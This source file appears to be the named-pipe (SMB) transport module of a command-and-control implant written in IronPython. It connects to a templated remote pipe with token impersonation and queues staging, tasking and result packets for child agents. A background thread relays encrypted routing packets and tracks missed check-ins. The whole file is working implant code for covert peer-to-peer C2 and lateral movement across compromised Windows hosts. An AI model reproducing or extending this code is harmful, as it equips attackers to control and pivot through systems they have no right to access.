import base64
import sys
import threading
import time

import clr

clr.AddReference('System.Core')
clr.AddReference("System.IO.Pipes")
import System.Collections.Generic
import System.IO.Pipes
import System.Threading
from System.IO.Pipes import (
    NamedPipeServerStream,
    PipeDirection,
    PipeOptions,
    PipeTransmissionMode,
)
from System.Security.Principal import TokenImpersonationLevel

# Create a queue to hold data to be sent through the pipe
smb_server_queue = System.Collections.Generic.Queue[str]()
send_queue = System.Collections.Generic.Queue[str]()
receive_queue = System.Collections.Generic.Queue[str]()

# Connect to the named pipe
pipe_name = "{{ pipe_name }}"
host = "{{ host }}"
pipe_client = System.IO.Pipes.NamedPipeClientStream(host, pipe_name, PipeDirection.InOut, 0,
                                                    TokenImpersonationLevel.Impersonation)
# Connect to the server
pipe_client.Connect()

def send_results_for_child(received_data):
    """
    Forwards the results of a tasking to the pipe server.
    """
    send_queue.Enqueue(received_data)
    return b''

def send_get_tasking_for_child(received_data):
    """
    Forwards the get tasking to the pipe server.
    """
    send_queue.Enqueue(received_data)
    return b''

def send_staging_for_child(received_data, hop_name):
    """
    Forwards the staging request to the pipe server.
    """
    send_queue.Enqueue(received_data)
    return b''

# Function to run in the separate thread to handle the named pipe connection
def pipe_thread_function():
    while True:
        time.sleep(1)
        if send_queue.Count > 0:
            pipe_writer = System.IO.StreamWriter(pipe_client)
            pipe_writer.WriteLine(send_queue.Peek())
            pipe_writer.Flush()
            send_queue.Dequeue()

            recv_pipe_reader = System.IO.StreamReader(pipe_client)
            received_data = recv_pipe_reader.ReadLine()
            receive_queue.Enqueue(received_data)

# Create and start the separate thread for the named pipe connection
pipe_thread = threading.Thread(target=pipe_thread_function)
pipe_thread.daemon = True
pipe_thread.start()

def send_message(packets=None):
    global missedCheckins
    global server
    global headers
    global taskURIs
    data = None

    if packets:
        encData = aes_encrypt_then_hmac(key, packets)
        data = build_routing_packet(stagingKey, sessionID, meta=5, encData=encData)
        data = base64.b64encode(data).decode('UTF-8')
        send_queue.Enqueue("1" + data)
    else:
        routingPacket = build_routing_packet(stagingKey, sessionID, meta=4)
        b64routingPacket = base64.b64encode(routingPacket).decode('UTF-8')
        send_queue.Enqueue("0" + b64routingPacket)

    while receive_queue.Count > 0:
        data = receive_queue.Peek()
        data = base64.b64decode(data)
        receive_queue.Dequeue()

        try:
            send_job_message_buffer()
        except Exception as e:
            result = build_response_packet(
                0, str("[!] Failed to check job buffer!: " + str(e))
            )
            process_job_tasking(result)
        if data.strip() == defaultResponse.strip() or data == base64.b64encode(defaultResponse):
            missedCheckins = 0
        else:
            decode_routing_packet(data)
    if data:
        return '200', data
    else:
        return '', ''